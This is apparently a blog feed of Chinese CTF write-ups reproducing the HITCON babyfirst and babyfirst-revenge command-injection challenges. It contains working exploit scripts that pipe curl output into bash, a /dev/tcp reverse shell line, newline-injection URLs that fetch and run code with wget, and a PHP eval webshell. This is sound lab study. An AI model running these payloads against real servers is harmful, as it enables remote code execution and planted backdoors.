<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    key = <span class="string">'17abeca4cc4c432a52c2b7f6d24d1888'</span></span><br><span class="line">    </span><br><span class="line">    output = <span class="string">"u6WHK2bnAsvTP/lPagu7c/K3la0mrveKrXryBPF/LKFE2HYgRNLGzr1J1yObUapw"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> range(<span class="number">0xB18E</span>):</span><br><span class="line">        passwd = generate_passwd(key.decode(<span class="string">"hex"</span>),result)</span><br><span class="line">        r = decrypt(output.decode(<span class="string">"base64"</span>), passwd)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">print</span> r</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;To be patient…&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;赶紧趁着电脑的屏幕修好了，刚好安恒的web题目有复现，赶紧做。。。。。又从这几个题目里面学习到新知识了
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
      <category term="Web" scheme="0verwatch.top/tags/Web/"/>
    
      <category term="Crypto" scheme="0verwatch.top/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge v2复现</title>
    <link href="0verwatch.top/2018/09/18/hitcon2017-babyfirstv2/"/>
    <id>0verwatch.top/2018/09/18/hitcon2017-babyfirstv2/</id>
    <published>2018-09-18T14:36:10.000Z</published>
    <updated>2018-09-18T14:39:35.907Z</updated>
    
    <content type="html"><![CDATA[<p>这个题目的条件更加苛刻了，先放个源码<a id="more"></a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">4</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></p><p>简单看一下这段代码比上一次的代码的cmd长度更小，很显然我们就不能再以<code>ls&gt;&gt;_</code> 来将相关的命令覆盖到文件里面了<br>但是orange大大用的方法真是叹为观止，根据官方payload一步步来分析这里是怎么巧妙的绕过4个字符串的长度的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">payload = [ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "g&gt; ht- sl" to file "v"</span></span><br><span class="line"> <span class="string">'&gt;dir'</span>, </span><br><span class="line"><span class="string">'&gt;sl'</span>,</span><br><span class="line"> <span class="string">'&gt;g\&gt;'</span>,</span><br><span class="line"> <span class="string">'&gt;ht-'</span>,</span><br><span class="line"> <span class="string">'*&gt;v'</span>,</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment"># reverse file "v" to file "x", content "ls -th &gt;g"</span></span><br><span class="line"> <span class="string">'&gt;rev'</span>,</span><br><span class="line"> <span class="string">'*v&gt;x'</span>, </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate "curl orange.tw|python;"</span></span><br><span class="line"> <span class="comment"># generate "curl 10.188.2.20|bash" </span></span><br><span class="line"><span class="string">'&gt;\;\\'</span>,</span><br><span class="line"> <span class="string">'&gt;sh\\'</span>, </span><br><span class="line"><span class="string">'&gt;ba\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\|\\'</span>,</span><br><span class="line"> <span class="string">'&gt;20\\'</span>,</span><br><span class="line"> <span class="string">'&gt;2.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;8.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;18\\'</span>,</span><br><span class="line"> <span class="string">'&gt;0.\\'</span>,</span><br><span class="line"> <span class="string">'&gt;1\\'</span>,</span><br><span class="line"> <span class="string">'&gt;\ \\'</span>,</span><br><span class="line"> <span class="string">'&gt;rl\\'</span>,</span><br><span class="line"> <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"></span><br><span class="line"> <span class="comment"># got shell</span></span><br><span class="line"> <span class="string">'sh x'</span>, </span><br><span class="line"><span class="string">'sh g'</span>,</span><br><span class="line"> ]</span><br></pre></td></tr></table></figure><p>首先第一个知识点就是Linux下存在<code>dir</code>命令作为<code>ls</code>命令的别名，可能有的系统没有，但是对于这道题而言是有的，而且他也是默认以字典序去排列，对于这题而言这个命令起到了拼接文件名的效果，但是注意含有特殊字符以及数字的情况下，字母排序的优先级会降低<br><img src="https://s1.ax1x.com/2018/09/18/ietTMt.png" alt="ietTMt.png"></p><p>第二个点在于单独一个<code>*</code>的命令有何作用，这个命令会先将当前目录下所有的文件进行一个排序，然后排序后的结果会以命令的形式送去<code>bash</code>执行，如下图，但是如果有写不是命令的话就会出现<code>command not found</code>的报错，这样一来我们就可一利用<code>dir</code>加上<code>*</code>命令去执行写入文件的操作，这也是这道题目关键之处，利用了逆序执行命令的骚操作，这得对Linux系统多么熟悉啊<br><img src="https://s1.ax1x.com/2018/09/18/iet7sP.png" alt="iet7sP.png"></p><p>接着上就提出下一个知识点，就是利用<code>rev</code>命令去反向文件的字符串，顾名思义，我们就是要把<code>ls -t &gt;g</code>这一条命令给逆序过来，这操作很强。这也是为什么要先构造下图中的文件名，你逆序过来就会发现是<code>ls -th &gt;g</code></p><p><img src="https://s1.ax1x.com/2018/09/18/ietHqf.png" alt="ietHqf.png"><br>有人可能会问为什么会多加一个<code>h</code>，因为如果不多加<code>h</code>的话在你执行<code>dir</code>的时候按字母排序字母<code>t</code>比<code>s</code>更靠后，放进<code>v</code>文件之后以及放入想文件里面是这样的，这就跟我们的目的相违背，不能构造出<code>ls -t &gt;g</code>了，但是我们构造的是<code>ls  -th &gt;g</code>情况就会有所改观，这个<code>h</code>实际上没有影响，就是一个改变视图结构的东西，把内存大小变得更加人性化而已。<br><img src="https://s1.ax1x.com/2018/09/18/ietqZ8.png" alt="ietqZ8.png"></p><p><img src="https://s1.ax1x.com/2018/09/18/ietLdS.png" alt="ietLdS.png"></p><p>按照上面所说把<code>v</code>文件的内容弄好，下面就应该创建一个<code>rev</code>的文件，为的是利用这个命令，通过<code>*v&gt;x</code>的方式把逆序后的内容放在x文件里面，到后期可以直接sh执行，<code>*v&gt;x</code>这个命令的含义就是将所有最后一个字母都是<code>v</code>的文件排个序，然后执行，因为r在v的前面实际上的命令就是 <code>rev v&gt;x</code>，所以最后到<code>x</code>文件里面的内容就是<br><img src="https://s1.ax1x.com/2018/09/18/ietjiQ.png" alt="ietjiQ.png"></p><p>到这里就跟第一个babyfirst-revenge一样了，后续步骤就不多说了,直接上EXP获取flag2333</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.第一个利用的点是逆序字符串放入文件中在执行，如果让我来想我是绝对想不到的，学习了<br>2.第二个就是利用了<code>dir</code>命令完美滴绕过了<code>ls&gt;&gt;x</code>这个限制<br>3.Linux下<code>*</code>命令巧妙使用</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个题目的条件更加苛刻了，先放个源码
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2015 babyfirst复现</title>
    <link href="0verwatch.top/2018/09/14/hitcon2015-babyfirst/"/>
    <id>0verwatch.top/2018/09/14/hitcon2015-babyfirst/</id>
    <published>2018-09-14T09:10:41.000Z</published>
    <updated>2018-09-14T09:25:54.736Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续上面的题目，直接利用上一道题目的docker环境复现一道题目<a id="more"></a>，注意这里面的docker环境可能需要自己在某些文件夹下面设置权限，自己缺点什么环境就自己下就行了，感觉这个题目的难度比较上一题低了一点，参考博客: <a href="https://blog.spoock.com/2017/09/09/Babyfirst-writeup/" target="_blank" rel="noopener">https://blog.spoock.com/2017/09/09/Babyfirst-writeup/</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先放个题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    $dir = <span class="string">'sandbox/'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !file_exists($dir) )</span><br><span class="line">        mkdir($dir);</span><br><span class="line">    chdir($dir);</span><br><span class="line"></span><br><span class="line">    $args = $_GET[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">for</span> ( $i=<span class="number">0</span>; $i&lt;count($args); $i++ )&#123;</span><br><span class="line">        <span class="keyword">if</span> ( !preg_match(<span class="string">'/^\w+$/'</span>, $args[$i]) )</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    exec(<span class="string">"/bin/orange "</span> . implode(<span class="string">" "</span>, $args));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一段代码的意思就是建立一个<code>sandbox/clientip</code>文件夹 ，然后利用通过get法师获取args的参数，然后里面有一个正则匹配，只能通过的是数字以及字母不然的话就会直接die掉，最后就是利用exec这个执行函数了，而/bin/orange最终发现只是/bin/true的软链接，没有任何的作用。</p><p>这个题目关键是那个正则，那个正则在很多题目也有见到过，由于preg_match()使用的是\w来进行检查，所有的斜线、破折号和点<code>(\,-,.)</code>都无法使用。另外就是在<code>/^\w+$\</code>中的<code>$</code>当遇到一个字符串的结尾是换行符时还是可以匹配的。利用这个特性，就可以绕过前面的<code>preg_match()</code>检查，同时多出的换行符还可以在<code>exec()</code>函数中执行。</p><p>个人感觉这个题目如果<code>implode</code>里面的分割用的不是空格而是其他的类似逗号的东西这一个题目不一定可以写文件，或许其他大佬有办法可以跟我讲讲。留了空格刚好就可以写文件了</p><p>比如传参的url是这样的<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=touch&amp;args[]=0ver</code><br>这三个参数都可以经过正则匹配<br>那么执行的过程就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/orange xxx</span><br><span class="line">touch test</span><br></pre></td></tr></table></figure><p>可以成功创建文件<br><img src="https://s1.ax1x.com/2018/09/14/iEgrQg.png" alt="iEgrQg.png"><br>这样一来，就先了正则，然后既可以创建文件了，如果implode里面不用空格分割的话，后面创建文件就会变成<code>touchtest</code>，这种东西是不可以创建文件的 </p><p>然后这里就是参考了大佬们的做法利用<code>wget</code>的方式去实现，tql</p><p>这里牵涉到另外一个知识点，我们平常见到的ip地址都是点分十进制表示的，其实IP地址还可以用直接10进制，八进制等等表示都可以</p><p>然后再开一个本地环境:192.168.1.106，服务器:192.168.1.102</p><p>在本地里面创建一个页面index.php内容为<code>&lt;?php phpinfo();?&gt;</code><br><a href="https://imgchr.com/i/iEgfYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgfYV.md.png" alt="iEgfYV.md.png"></a></p><p>然后再往服务器发送相应的参数，这时候的ip地址转化就起作用了，把本地ip换一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">"%u"</span>, ip2long(<span class="string">"192.168.1.106"</span>));</span><br></pre></td></tr></table></figure><p>得到输出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3232235882</span><br></pre></td></tr></table></figure></p><p>这里用的这样的输出方法是为了解决32位以及64位php版本的问题，因为由于自己的php版本是32 位的输出的是负数，所以才用这样的的解决方法，参考链接<br><a href="https://blog.csdn.net/everything1209/article/details/22418559" target="_blank" rel="noopener">https://blog.csdn.net/everything1209/article/details/22418559</a></p><p>这时候就是开始利用了<br><code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=wget&amp;args[]=3232235882</code><br>然后就直接把192.168.1.106主页的页面给下载下来，但是这个页面是解析过了的，没有任何PHP语言的痕迹，只剩下html了<br><a href="https://imgchr.com/i/iEgIlF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgIlF.md.png" alt="iEgIlF.md.png"></a></p><p>这时候又是另外一个知识点了<br>在Linux中PHP能够执行非压缩的打包的PHP文件。<br>也就是这样的过程<br>创建1.php，内容为<code>&lt;?php echo &quot;123&quot;;?&gt;</code>，通过<code>tar</code>将<code>1.php</code>打包,<code>tar cvf test 1.php</code>，PHP运行test文件，可以运行<br><a href="https://imgchr.com/i/iEgHm9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iEgHm9.md.png" alt="iEgHm9.md.png"></a></p><p>复现到这里，发现orange大佬真是强，到后期就是利用上面两个知识点</p><p>在原来的本地的index.html里面改成这样的代码，注意一定要在<code>index.html</code>里面写上这样的语句，不然的话就会在像上面的例子一样在<code>index.php</code>里面的语句会被解析之后下载，会毫无用处下载下来是没有php语句的，更别谈解析了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'cmd.php'</span>, <span class="string">'</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">header("Content-Type: text/plain");</span></span><br><span class="line"><span class="string"> @eval($_POST["cmd"]);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">'</span>);</span><br></pre></td></tr></table></figure><p>然后开始写webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=mkdir&amp;args[]=exploit 创建exploit文件夹</span><br><span class="line">http://192.168.1.102/?args[]=xxx%0a&amp;args[]=cd&amp;args[]=exploit%0a&amp;args[]=wget&amp;args[]=3232275969   进入exploit文件夹，下载192.168.158.1的index.html文件。</span><br></pre></td></tr></table></figure><p>然后就是利用打包的方式去执行相关的PHP代码了，想直接改名字是不可能的因为命令里面含有<code>&#39;.&#39;</code>这样的字符<br>再来一句<code>http://192.168.1.102/?args[]=xxx%0a&amp;args[]=php&amp;args[]=cmd</code> 执行一波这个打包未压缩的PHP文件</p><p>然后可以执行一句话木马了，打开小马页面<code>http://192.168.1.102/sandbox/192.168.1.102/cmd.php</code>，上菜刀链接成功<br><a href="https://imgchr.com/i/iE2S6e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/14/iE2S6e.md.png" alt="iE2S6e.md.png"></a></p><p>再看一下服务器下面的目录成功创建了<code>cmd.php</code>页面<br><img src="https://s1.ax1x.com/2018/09/14/iE2Kmj.png" alt="iE2Kmj.png"></p><p>再看看出题人的官方wp发现还有其他骚操作<br>就是利用一波<code>ftp</code>方式去下载远程的一句话木马，因为自己虚拟机没有<code>busybox</code>这个东西就不搞了<br>但还是得过一遍脑紫的，利用下面的命令把远处<code>ftp</code>服务器里面的<code>webshell.php</code>给下载下来，这样做的好处就是不用再管原来那些php繁琐的解析步骤，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">busybox ftpget -u ftp的用户名 -p ftp的密码 ftp地址 需要下载的文件名</span><br></pre></td></tr></table></figure><p>很好的思路学习了，不一定就是busybox，还有其他利用ftp的下载功能来获取webshell的。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.两个运用的知识点远程wget下载的PHP文件是经过解析的，服务器是可以通过用php执行打包的文件的，注意不是压缩的PHP文件，有点像是两个本来安全的东西放在一起后就变成了不安全的东西。。。。个人感觉问题的严重性还是出现在php能够执行未压缩的打包文件上。<br>2根据上一次的复现题目，个人感觉命令执行在这两道题目的上面都利用了远程的另外一台主机，第一次是使用了curl命令去访问，而这次是通过wget或者是ftp去访问，骚操作又学习了一波<br>3.正则可以换行符继续匹配那个点就不多说了</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;继续上面的题目，直接利用上一道题目的docker环境复现一道题目
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
      <category term="命令执行" scheme="0verwatch.top/categories/CTF/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Hitcon2017 babyfirst-revenge复现</title>
    <link href="0verwatch.top/2018/09/06/hitcon2017-babyfirst/"/>
    <id>0verwatch.top/2018/09/06/hitcon2017-babyfirst/</id>
    <published>2018-09-06T09:30:36.000Z</published>
    <updated>2018-09-14T09:25:06.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>开学了还是得学习的，复现一波题目来玩玩，其实是实力不够不能去打网鼎杯<a id="more"></a>emmm</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>先从Hitcon2017 babyfirst-revenge这一个题目，总结一下还是学到很多东西的<br>复现地址 <a href="https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/Pr0phet/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p><p>这是题目回显的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这个源码的意思就是会自动创建一个<code>/www/sandbox/</code>然后在下面新建文件夹，然后可以通过<code>cmd</code>参数去执行相关系统命令，但是这个系统命令的长度是会有限制的，这题的关键在于要绕过这个长度以及如何去构造<code>getshell</code>的命令。<br>突然发现P神就是很早就有类似文章，我还是太菜，得拼命学习啊<br><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html" target="_blank" rel="noopener">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><h4 id="知识点一"><a href="#知识点一" class="headerlink" title="知识点一"></a>知识点一</h4><p>在Linux下面可以通过换行去执行断断续续的命令，例如<br><img src="https://s1.ax1x.com/2018/09/06/iCZyI1.png" alt="iCZyI1.png"></p><h4 id="知识点二"><a href="#知识点二" class="headerlink" title="知识点二"></a>知识点二</h4><p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过<br>如<br><a href="https://imgchr.com/i/iCZgG6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCZgG6.md.png" alt="iCZgG6.md.png"></a></p><h4 id="知识点三"><a href="#知识点三" class="headerlink" title="知识点三"></a>知识点三</h4><p>我们可以通过&gt;+fileanme来实现新建一个文件，注意区别一下<code>&gt;</code>和<code>&gt;&gt;</code>这两个符号<br>小于号：命令默认从键盘获得的输入，改成从文件，或者其它打开文件以及设备输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; 是追加内容</span><br><span class="line">&gt; 是覆盖原有内容</span><br></pre></td></tr></table></figure><p>后面会有这里的详细利用</p><p>这样就可以运用这两个知识点去实现这段代码的绕过<br>思路就是通过构造一个文件然后往里面写入类似<code>curl 192.168.1.104|bash</code> 之类的语句然后执行，其实还可以利用其他python 以及PHP环境去执行代码，访问 <code>192.168.1.104/index.php</code>里面的内容<code>bash -i &gt;&amp; /dev/tcp/192.168.1.104/12345 0&gt;&amp;1</code>从而达到反弹webshell的目的</p><p>这里面注意两个点<br>第一点<code>ls</code>命令列文件的顺序，通过php执行的ls命令以及直接在linux下执行的ls命令是不一样的，因为我们一开始的输入是从php里面开始的<br>ls 的默认排序方式手册上只写了是<code>alphabetically</code>（字典序），经过测试发现ls排序方式是忽视字母大小写，数字排在字母前面，无视数字和英文字母之外的字符。<br>php执行生成的_的内容序列并非和我们在linux命令行一样，查资料 ls 排序和应该和环境变量<code>LC_COLLATE</code>有关！而php应该是c<br><a href="https://www.zhihu.com/question/273928679" target="_blank" rel="noopener">https://www.zhihu.com/question/273928679</a><br><img src="https://s1.ax1x.com/2018/09/06/iCetwd.png" alt="iCetwd.png"></p><p>所以还是按照官方wp那样通过追加方式去添加内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'&gt;ls\\'</span>, </span><br><span class="line"> <span class="string">'ls&gt;_'</span>, </span><br><span class="line"> <span class="string">'&gt;\ \\'</span>, </span><br><span class="line"> <span class="string">'&gt;-t\\'</span>, </span><br><span class="line"> <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line"> <span class="string">'ls&gt;&gt;_'</span>,</span><br></pre></td></tr></table></figure><p>就是为了拼凑出<code>ls -t&gt;g</code>，这是为了后面构造<code>curl 192.168.1.104|bash</code> 做好准备，我们就可以通过时间的先后顺序把curl命令完整的拼接</p><p>第二点我们是通过构造文件名，然后通过<code>ls</code>命令将文件名写入到另外一个文件里面去然后执行，这里面要注意转义符号<code>\</code>(反斜杠)不要忘记</p><p>然后我们在自己的vps上先写好反弹webshell的话<br><a href="https://imgchr.com/i/iCeaFI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCeaFI.md.png" alt="iCeaFI.md.png"></a></p><p>开始监听端口<br><img src="https://s1.ax1x.com/2018/09/06/iCeBSf.png" alt="iCeBSf.png"></p><p>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="string">'&gt;ls\\'</span>, </span><br><span class="line">    <span class="string">'ls&gt;_'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;-t\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\&gt;g'</span>, </span><br><span class="line">    <span class="string">'ls&gt;&gt;_'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># generate `curl orange.tw.tw|python`</span></span><br><span class="line">    <span class="comment"># generate `curl 10.188.2.20|bash` </span></span><br><span class="line">    <span class="string">'&gt;sh\ '</span>, </span><br><span class="line">    <span class="string">'&gt;ba\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\|\\'</span>,</span><br><span class="line">    <span class="string">'&gt;6\\'</span>,  </span><br><span class="line">    <span class="string">'&gt;10\\'</span>,</span><br><span class="line">    <span class="string">'&gt;1.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;8.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;16\\'</span>, </span><br><span class="line">    <span class="string">'&gt;2.\\'</span>, </span><br><span class="line">    <span class="string">'&gt;19\\'</span>, </span><br><span class="line">    <span class="string">'&gt;\ \\'</span>, </span><br><span class="line">    <span class="string">'&gt;rl\\'</span>, </span><br><span class="line">    <span class="string">'&gt;cu\\'</span>, </span><br><span class="line"></span><br><span class="line">    <span class="comment"># exec</span></span><br><span class="line">    <span class="string">'sh _'</span>, </span><br><span class="line">    <span class="string">'sh g'</span>, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = requests.get(<span class="string">'http://192.168.1.104:49200//?reset=1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">5</span> </span><br><span class="line">    r = requests.get(<span class="string">'http://192.168.1.104:49200//?cmd='</span> + quote(i) )</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure><p>反弹webshell成功<br>然后在<code>/home</code>目录下发现有关flag的东西，应该是在数据库里面<br>连接一下<br><img src="https://s1.ax1x.com/2018/09/06/iCeDl8.png" alt="iCeDl8.png"><br>交互性极差，每次都要exit一下才有回显，也是服气。。。但最后还是得到flag了<br><a href="https://imgchr.com/i/iCer6S" target="_blank" rel="noopener"><img 